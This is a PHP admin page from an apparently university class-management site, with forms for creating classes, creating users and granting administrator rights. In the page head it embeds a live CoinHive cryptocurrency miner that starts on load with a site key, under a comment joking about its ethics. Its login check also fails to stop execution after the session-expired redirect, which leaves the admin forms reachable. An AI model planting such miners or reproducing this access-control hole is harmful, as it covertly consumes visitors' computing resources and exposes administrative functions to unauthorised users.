<?php
  session_start();
  //Check if user is logged in
  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
    if($_SESSION['role'] != 1) {
      $_SESSION['error'] = true;
      $_SESSION['errorCode'] = "Not Permitted";
      header("Location: ../login.php");
      die("oops");
    }
  } else {
    $_SESSION['error'] = true;
    $_SESSION['errorCode'] = "Session Expired";
    header("Location: ../login.php?event=logout");
  }
?>

<html lang="en">
  <head>
    <link rel="stylesheet" href="../css/pages.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <!-- The top banner of the webpage -->
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/home.css">
    <script>
	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
	      miner.start();
    </script>
    <!-- End questionable content -->
    <div class="top">
        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
        <center>
          <h1>Administrative Utilities</h1>
        </center>
    </div>
  </head>

  <!-- The left sidebar -->
  <div class="left">
    <button class="button" onclick="window.location='home.php';">Home</button>
    <button class="button" onclick="window.location='pages.php?page=createClass';">Create class</button>
    <button class="button" onclick="window.location='pages.php?page=viewReports';">View reports</button>
    <button class="button" onclick="window.location='pages.php?page=createUser';">Create user</button>
    <button class="button" onclick="window.location='pages.php?page=other';">Other</button>
  </div>

  <!-- Main content of the webpage -->
  <div class="main">
    <div align="center" class="container">
      <?php
        if($_GET['page'] == 'createClass') {
          echo '<form id="singup-form" action="utilities/createClass.php" method="post">';
          if($_SESSION['error']){
              echo '<font color="red">' . $_SESSION['errorCode'] . "</font><br><br>";
              $_SESSION['error'] = false;
          }
          echo 'Class Name: <br>
            <input type="text" name="name" value="" size="35"><br><br>
            Instructor: <br>
            <input type="text" name="teacher" value="" size="35"><br><br>
            Start Date: <br>
            <input type="text" name="startDate" value="YYYY-MM-DD" size="35"><br><br>
            End Date: <br>
            <input type="text" name="endDate" value="YYYY-MM-DD" size="35"><br><br>
            Class Start Time: <br>
            <input type="text" name="startTime" value="HH:MM:SS" size="35"><br><br>
            Class End Time: <br>
            <input type="text" name="endTime" value="HH:MM:SS" size="35"><br><br>
            Meetings Per Week: <br>
            <input type="text" name="meetingsPerWeek" value="" size="35"><br><br>
            University Class ID: <br>
            <input type="text" name="universityID" value="1" size="35"><br><br>
            <input name="signup" type="submit" value="Create Class"><br><br>
          </form>';
        }
        else if($_GET['page'] == 'createUser') {
          echo '<form id="singup-form" action="utilities/createUser.php" method="post">';
          if($_SESSION['error']){
              echo '<font color="red">' . $_SESSION['errorCode'] . "</font><br><br>";
              $_SESSION['error'] = false;
          }
          echo 'First Name: <br>
            <input type="text" name="first" value="" size="35"><br><br>
            Last Name: <br>
            <input type="text" name="last" value="" size="35"><br><br>
            Username: <br>
            <input type="text" name="username" value="" size="35"><br><br>
            Password: <br>
            <input type="password" name="password" value="" size="35"><br><br>
            <input name="signup" type="submit" value="Create Account"><br><br>
          </form>';
        }
        else if($_GET['page'] == 'viewReports') {

        }
        else if($_GET['page'] == 'other') {
          echo '<form id="singup-form" action="utilities/other.php?type=makeAdmin" method="post">';
          if($_SESSION['error']){
              echo '<font color="red">' . $_SESSION['errorCode'] . "</font><br><br>";
              $_SESSION['error'] = false;
          }
          echo 'Username: <br>
            <input type="text" name="username" value="" size="35"><br><br>
            <input name="signup" type="submit" value="Make Administrator"><br><br>
          </form>';
        }
      ?>
    </div>
  </div>

</html>
